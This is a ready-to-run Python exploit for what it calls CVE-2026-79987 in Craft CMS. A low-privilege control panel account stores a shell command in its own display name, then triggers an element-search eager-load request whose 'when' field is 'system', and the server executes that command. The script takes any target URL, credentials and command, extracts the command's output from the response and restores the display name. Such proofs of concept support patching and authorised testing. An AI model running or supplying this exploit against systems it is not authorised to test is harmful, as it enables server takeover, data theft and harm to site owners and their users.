#!/usr/bin/env python3
"""Craft CMS authenticated RCE via element-search criteria.with[].when (CVE-2026-79987).

A control panel account with only the `accessCp` permission stores a command in its
own display name, then posts an element-search request whose nested `when` reaches
the untyped EagerLoadPlan::$when. Craft calls `system()` on the User, which
stringifies to that name. Fixed in Craft 5.10.13 (GHSA-9c4j-cjw3-r3xx).
"""

import argparse
import secrets
import shlex
import os
import sys

import requests

# --- self-contained terminal UI ---
_BANNER = r"""
  ____ ____      _    _____ _____
 / ___|  _ \    / \  |  ___|_   _|
| |   | |_) |  / _ \ | |_    | |
| |___|  _ <  / ___ \|  _|   | |
 \____|_| \_\/_/   \_\_|     |_|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color():
    global _COLOR
    _COLOR = False


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg):
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg):
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg):
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg):
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def die(msg):
    bad(msg)
    sys.exit(1)


def output(data, label="command output"):
    good(label)
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    if isinstance(data, str):
        data = data.encode()
    sys.stdout.buffer.write(data)
    if data and not data.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    sys.stdout.buffer.flush()
# --- end terminal UI ---

TIMEOUT = 20


def action(url, route):
    return f"{url.rstrip('/')}/actions/{route}"


def save_ok(resp):
    if resp.status_code != 200:
        return False
    try:
        return "errors" not in resp.json()
    except ValueError:
        return True


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n  %(prog)s -u https://target.example/admin -U editor -p 'pass' -c id\n")
    ap.add_argument("-u", "--url", required=True, metavar="URL", help="control panel URL, e.g. https://host/admin")
    ap.add_argument("-U", "--username", required=True, metavar="USER")
    ap.add_argument("-p", "--password", required=True, metavar="PASS")
    ap.add_argument("-c", "--command", default="id", metavar="CMD", help="command to run (default: id)")
    ap.add_argument("-k", "--insecure", action="store_true", help="skip TLS verification")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.no_color:
        disable_color()

    banner("authenticated element-search eager-load RCE  ·  CVE-2026-79987")

    s = requests.Session()
    s.verify = not args.insecure
    s.headers.update({"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"})
    if args.insecure:
        requests.packages.urllib3.disable_warnings()

    info(f"Authenticating as {args.username}")
    csrf = s.get(action(args.url, "users/session-info"), timeout=TIMEOUT).json()["csrfTokenValue"]
    user = s.post(action(args.url, "users/login"),
                  json={"loginName": args.username, "password": args.password},
                  headers={"X-CSRF-Token": csrf}, timeout=TIMEOUT).json().get("user")
    if not isinstance(user, dict):
        die("login failed (the account may require 2FA)")
    uid = int(user["id"])
    original = user.get("fullName") or ""
    good(f"Logged in as user {uid} (admin={str(bool(user.get('admin'))).lower()})")

    start, end = secrets.token_hex(8), secrets.token_hex(8)
    payload = f"printf %s {start}; sh -c {shlex.quote(args.command)} 2>&1; printf %s {end}"
    if len(payload) > 255:
        die("command too long for the fullName field (255 chars)")

    csrf = s.get(action(args.url, "users/session-info"), timeout=TIMEOUT).json()["csrfTokenValue"]
    staged = False
    try:
        info("Staging command in the account's display name")
        r = s.post(action(args.url, "users/save-user"), json={"userId": uid, "fullName": payload},
                   headers={"X-CSRF-Token": csrf}, timeout=TIMEOUT)
        staged = save_ok(r)
        if not staged:
            die(f"could not stage the payload in fullName (HTTP {r.status_code})")

        info("Triggering element-search eager-load (with[].when = system)")
        r = s.post(action(args.url, "element-search/search"),
                   json={"elementType": "craft\\elements\\User", "siteId": None, "search": "",
                         "criteria": {"id": uid, "with": [{"path": "photo", "when": "system"}]},
                         "excludeIds": []},
                   headers={"X-CSRF-Token": csrf}, timeout=TIMEOUT)
        body = r.content
        a = body.find(start.encode())
        b = body.find(end.encode(), a + len(start)) if a >= 0 else -1
        if a < 0 or b < 0:
            die(f"no command output in response (HTTP {r.status_code})")
        output(body[a + len(start):b])
    finally:
        if staged:
            rr = s.post(action(args.url, "users/save-user"), json={"userId": uid, "fullName": original},
                        headers={"X-CSRF-Token": csrf}, timeout=TIMEOUT)
            if save_ok(rr):
                info("Restored the original display name")
            else:
                warn(f"could not restore fullName to {original!r}, restore it manually")


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"request failed: {e}")
    except KeyboardInterrupt:
        sys.exit(130)
